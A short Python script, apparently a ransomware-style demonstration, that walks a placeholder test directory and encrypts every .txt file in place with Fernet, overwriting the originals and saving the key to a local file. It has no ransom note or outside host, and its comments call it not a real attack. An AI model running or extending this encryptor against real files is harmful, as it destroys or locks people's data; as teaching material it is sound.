import os
from cryptography.fernet import Fernet

# config
TARGET_DIRECTORY = "/path/to/your/test_directory" 

# key gen and storage
def generate_key():
    """Generates a key and saves it into a file."""
    key = Fernet.generate_key()
    # save the key to a file since its not a real attack
    with open("thekey.key", "wb") as key_file:
        key_file.write(key)
    return key

# encryption
def encrypt_file(file_path, key):
    """Encrypts a single file and deletes the original."""
    f = Fernet(key)
    with open(file_path, "rb") as original_file:
        original_data = original_file.read()

    encrypted_data = f.encrypt(original_data)

    # replace the original
    with open(file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)
    print(f"Encrypted: {file_path}")

# main
if __name__ == "__main__":
    if not os.path.exists(TARGET_DIRECTORY):
        print(f"Error: Directory '{TARGET_DIRECTORY}' not found.")
        exit()

    # gen a key for this
    encryption_key = generate_key()
    print(f"Key generated and saved as 'thekey.key'.")
    print(f"Starting encryption in directory: {TARGET_DIRECTORY}")

    # all .txt
    for root, _, files in os.walk(TARGET_DIRECTORY):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, encryption_key)

    print("\nEncryption complete. To decrypt, you would need the key.")
